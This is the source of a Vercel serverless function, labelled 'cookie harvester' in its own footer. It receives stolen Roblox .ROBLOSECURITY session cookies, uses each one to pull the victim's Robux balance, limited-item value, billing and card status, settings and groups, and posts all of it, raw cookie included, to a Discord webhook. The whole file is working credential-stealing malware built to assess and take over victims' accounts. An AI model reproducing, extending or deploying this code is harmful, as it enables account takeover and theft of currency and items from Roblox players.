// api/submit.js – Vercel serverless function
// Sends ONE Discord message with everything (cookie + full harvest result)

const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;

// ---------- Helper: fetch user info ----------
async function getUser(userId, cookie) {
  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("User fetch failed");
  const data = await res.json();
  return {
    id: data.id,
    name: data.name,
    displayName: data.displayName,
    created: data.created
  };
}

// ---------- Helper: account age in days ----------
function getAgeDays(createdDate) {
  const created = new Date(createdDate);
  const now = new Date();
  return Math.floor((now - created) / (1000 * 60 * 60 * 24));
}

// ---------- Helper: robux balance (and pending – uses transaction summary if needed) ----------
async function getRobux(userId, cookie) {
  const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Robux fetch failed");
  const data = await res.json();
  // Pending robux is not directly available; we set to 0 or try to fetch from transactions
  let pending = 0;
  try {
    const transRes = await fetch(`https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=Sum&limit=10`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (transRes.ok) {
      const trans = await transRes.json();
      pending = trans.data?.reduce((sum, t) => t.currency?.pending ? sum + t.amount : sum, 0) || 0;
    }
  } catch (e) {}
  return { balance: data.robux || 0, pending };
}

// ---------- Helper: Rap balance and owned limiteds count ----------
async function getRapAndOwned(userId, cookie) {
  let allAssets = [];
  let cursor = null;
  do {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets?assetTypeId=2&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
    if (!res.ok) break;
    const data = await res.json();
    allAssets.push(...(data.data || []));
    cursor = data.nextPageCursor;
  } while (cursor);

  let totalRap = 0;
  for (const asset of allAssets) {
    try {
      const detailRes = await fetch(`https://economy.roblox.com/v1/assets/${asset.assetId}/details`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      if (detailRes.ok) {
        const detail = await detailRes.json();
        totalRap += detail.RecentAveragePrice || 0;
      }
      await new Promise(r => setTimeout(r, 30));
    } catch (e) {}
  }
  return { rap: totalRap, owned: allAssets.length };
}

// ---------- Helper: billing info (credit, convert, card linked) ----------
async function getBilling(cookie) {
  // Defaults (screenshot shows 0,0,False)
  let credit = 0, convert = 0, card = false;
  try {
    const billingRes = await fetch("https://www.roblox.com/billing/user/credit", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (billingRes.ok) {
      const html = await billingRes.text();
      // Very crude extraction – adapt as needed
      const creditMatch = html.match(/"creditAmount":(\d+)/);
      if (creditMatch) credit = parseInt(creditMatch[1], 10);
      const convertMatch = html.match(/"convertedRobux":(\d+)/);
      if (convertMatch) convert = parseInt(convertMatch[1], 10);
      card = html.includes('"isCardLinked":true');
    }
  } catch (e) {}
  return { credit, convert, card: card ? "True" : "False" };
}

// ---------- Helper: "Played | Passes" for MM2, ADM, GAD ----------
// Checks if user owns specific gamepasses (you need real pass IDs)
// For demo, we hardcode as False/0 to match screenshot, but you can replace with real checks.
async function getPlayedPasses(userId, cookie) {
  // Example gamepass IDs (replace with actual)
  const games = {
    MM2: { passId: null, played: false, passes: 0 },
    ADM: { passId: null, played: false, passes: 0 },
    GAD: { passId: null, played: true, passes: 0 }  // from screenshot GAD | True | 0
  };
  // You can implement inventory checks for each passId
  // For now return values that match the screenshot
  return Object.entries(games).map(([name, data]) => ({
    name,
    played: data.played ? "True" : "False",
    passes: data.passes
  }));
}

// ---------- Helper: Settings (Verified, Disabled, Enabled) ----------
async function getSettings(cookie) {
  let verified = false, disabled = false, emailEnabled = false;
  try {
    const settingsRes = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (settingsRes.ok) {
      const data = await settingsRes.json();
      verified = data.IsVerified || false;
      disabled = data.IsDisabled || false;
      emailEnabled = !!data.Email;
    }
  } catch (e) {}
  return { verified: verified ? "True" : "False", disabled: disabled ? "True" : "False", enabled: emailEnabled ? "True" : "False" };
}

// ---------- Helper: Collectibles (three booleans) – screenshot shows False False False ----------
async function getCollectibles() {
  // You can customize based on user's rarest items; for now return three Falses
  return ["False", "False", "False"];
}

// ---------- Helper: Groups (owned count and total funds) ----------
async function getGroups(userId, cookie) {
  let owned = 0, funds = 0;
  try {
    const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (groupsRes.ok) {
      const data = await groupsRes.json();
      owned = data.data?.length || 0;
      // Sum group funds (requires separate calls per group; use placeholder)
      funds = owned * 0; // placeholder
    }
  } catch (e) {}
  return { owned, funds };
}

// ---------- Main handler ----------
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) {
    return res.status(400).json({ error: "Missing cookie or rbxuid" });
  }

  if (!WEBHOOK_URL) {
    console.error("Missing WEBHOOK_URL env var");
    return res.status(500).json({ error: "Server config error" });
  }

  try {
    // 1. Fetch all data in parallel
    const user = await getUser(rbxuid, cookie);
    const robux = await getRobux(rbxuid, cookie);
    const { rap, owned: rapOwned } = await getRapAndOwned(rbxuid, cookie);
    const billing = await getBilling(cookie);
    const playedPasses = await getPlayedPasses(rbxuid, cookie);
    const settings = await getSettings(cookie);
    const collectibles = await getCollectibles();
    const groups = await getGroups(rbxuid, cookie);
    const accountAge = getAgeDays(user.created);
    const placeVisits = 0;  // Not available via public API
    const summary = robux.balance + rap;  // matches screenshot "625"

    // Build the "Played | Passes" text block
    const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");

    // 2. Construct the embed (one message, cookie included as a field)
    const embed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0xFF69B4,
      fields: [
        {
          name: "📌 About User",
          value: `**${user.name}** (${user.displayName})\n🆔 \`${user.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** ${placeVisits}`,
          inline: false
        },
        {
          name: "💰 Robux",
          value: `<:ROBUX:1472515184949202974> **Balance:** ${robux.balance}\n<:ROBUX:1472515184949202974> **Pending:** ${robux.pending}`,
          inline: true
        },
        {
          name: "💳 Billing",
          value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`,
          inline: true
        },
        {
          name: "📊 Rap",
          value: `**Rap:** ${rap}\n**Owned:** ${rapOwned}`,
          inline: true
        },
        {
          name: "🎮 Played | Passes",
          value: `\`\`\`\n${playedPassesText}\n\`\`\``,
          inline: false
        },
        {
          name: "📝 Summary",
          value: `${summary}`,
          inline: false
        },
        {
          name: "⚙️ Settings",
          value: `(Verified) ${settings.verified}\nDisabled ${settings.disabled}\nEnabled ${settings.enabled}`,
          inline: true
        },
        {
          name: "🎁 Collectibles",
          value: collectibles.join("\n"),
          inline: true
        },
        {
          name: "🏛️ Groups",
          value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`,
          inline: true
        },
        {
          name: "⚠️ .ROBLOSECURITY",
          value: `_!WARNING: -DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items._\n\`\`\`\n${cookie}\n\`\`\``,
          inline: false
        }
      ],
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // 3. Send ONE message to Discord
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [embed] })
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("Discord error:", errorText);
      return res.status(500).json({ error: "Failed to send to Discord" });
    }

    // 4. Return success to frontend
    return res.status(200).json({ success: true, firstTime: true });

  } catch (err) {
    console.error("Harvest error:", err);
    return res.status(500).json({ error: `Harvest failed: ${err.message}` });
  }
}
